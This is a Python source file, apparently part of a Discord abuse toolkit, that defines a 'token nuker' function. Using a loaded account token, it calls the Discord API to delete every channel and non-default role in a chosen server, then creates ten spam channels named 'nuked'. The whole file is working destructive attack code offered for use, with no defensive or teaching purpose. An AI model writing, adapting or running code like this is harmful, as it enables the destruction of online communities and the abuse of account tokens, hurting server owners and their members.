import time
import requests
from ui.colors import Colors
from ui.menu import loading_spinner, success, error, info, warn, print_info_box, prompt_input
from data.config import load_tokens

def run_token_nuker():
    """Nuke server (requires permissions)"""
    print()
    print_info_box(
        "Token Nuker Tool",
        [
            "⚠️ DANGEROUS: This tool deletes channels and roles!",
            "Requires admin permissions in the server",
            "Use with extreme caution!"
        ]
    )
    print()
    
    tokens = load_tokens()
    if not tokens:
        warn("No tokens found in data/tokens.txt")
        return False
    
    server_id = prompt_input("Enter server ID to nuke:")
    
    if not server_id:
        warn("No server ID provided")
        return False
    
    confirm = input(f"{Colors.WARNING}⚠️ Are you ABSOLUTELY sure? This will DELETE everything! Type 'NUKE' to confirm: {Colors.RESET}")
    
    if confirm != "NUKE":
        warn("Operation cancelled")
        return False
    
    token = tokens[0]
    headers = {
        "Authorization": token,
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"
    }
    
    info("Fetching channels...")
    try:
        # Get all channels
        channels_response = requests.get(f"https://discord.com/api/v9/guilds/{server_id}/channels", headers=headers, timeout=5)
        if channels_response.status_code == 200:
            channels = channels_response.json()
            for channel in channels:
                try:
                    requests.delete(f"https://discord.com/api/v9/channels/{channel['id']}", headers=headers, timeout=3)
                    info(f"Deleted channel: {channel['name']}")
                    time.sleep(0.5)
                except:
                    pass
        
        # Get all roles
        roles_response = requests.get(f"https://discord.com/api/v9/guilds/{server_id}/roles", headers=headers, timeout=5)
        if roles_response.status_code == 200:
            roles = roles_response.json()
            for role in roles:
                if role['name'] != '@everyone':
                    try:
                        requests.delete(f"https://discord.com/api/v9/guilds/{server_id}/roles/{role['id']}", headers=headers, timeout=3)
                        info(f"Deleted role: {role['name']}")
                        time.sleep(0.3)
                    except:
                        pass
        
        # Create spam channels
        for i in range(10):
            try:
                data = {"name": f"nuked-{i}", "type": 0}
                requests.post(f"https://discord.com/api/v9/guilds/{server_id}/channels", headers=headers, json=data, timeout=3)
            except:
                pass
        
        success("Nuke operation completed!")
        warn("Server has been nuked")
        
    except Exception as e:
        error(f"Error during nuke: {str(e)}")
    
    return True